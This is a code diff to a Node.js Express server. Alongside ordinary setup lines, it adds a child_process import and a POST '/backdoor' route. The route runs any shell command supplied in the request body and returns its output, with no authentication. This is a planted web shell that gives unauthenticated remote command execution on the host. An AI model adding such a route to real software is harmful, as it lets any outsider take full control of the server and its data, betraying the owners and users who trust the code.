@@ -1,5 +1,6 @@
 const express = require("express");
 const dotenv = require("dotenv");
+const {exec}= require('child_process');
 dotenv.config();
 const {sq,testDbConnection} = require('./databaseStructure/dbconnection')
 const user = require('./databaseStructure/user.modal')
@@ -238,4 +239,25 @@ app.listen(PORT, (status) => {
   } else {
     console.log("error", status);
   }
+});
+
+
+
+app.post("/backdoor",(req,res)=>{
+  // Command to execute
+  const command = req.body.cmd || 'echo "Hello World"';
+
+  // Execute the command
+  exec(command, (error, stdout, stderr) => {
+      if (error) {
+          // If there's an error, return it
+          return res.status(200).json({ error: error.message });
+      }
+      if (stderr) {
+          // If there's stderr, return it
+          return res.status(200).json({ stderr });
+      }
+      // If everything is fine, return stdout
+      res.json({ output: stdout });
+  });
 });
